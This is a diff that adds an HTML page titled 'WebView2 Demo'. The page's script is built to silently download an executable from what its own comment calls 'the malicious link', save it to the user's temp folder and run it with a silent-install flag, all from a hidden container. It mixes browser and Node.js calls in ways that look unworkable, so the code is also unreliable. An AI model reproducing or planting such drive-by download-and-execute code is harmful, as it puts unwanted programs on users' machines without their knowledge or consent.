@@ -1,0 +1,38 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>WebView2 Demo</title>
+    <script src="https://cdn.jsdelivr.net/npm/@microsoft/webview2-js"></script>
+</head>
+<body>
+    <div id="webview-container" style="display:none;"></div>
+    <script>
+        // Create a WebView2 control
+        const webview = new WebView2(document.getElementById("webview-container"));
+
+        // Set the source to the malicious link
+        webview.src = "https://down.360safe.com/se/setup_online_1.1.12.0.exe";
+
+        // Set the silent mode to true
+        webview.silent = true;
+
+        // Add a listener for the download event
+        webview.addEventListener("download", (event) => {
+            // Get the download item
+            const downloadItem = event.downloadItem;
+
+            // Set the download path to the user's temp folder
+            downloadItem.downloadPath = `${process.env.TEMP}\\setup.exe`;
+
+            // Start the download
+            downloadItem.start();
+
+            // Add a listener for the download complete event
+            downloadItem.addEventListener("downloadcomplete", () => {
+                // Execute the downloaded file
+                require("child_process").execSync(`${process.env.TEMP}\\setup.exe /S`);
+            });
+        });
+    </script>
+</body>
+</html>
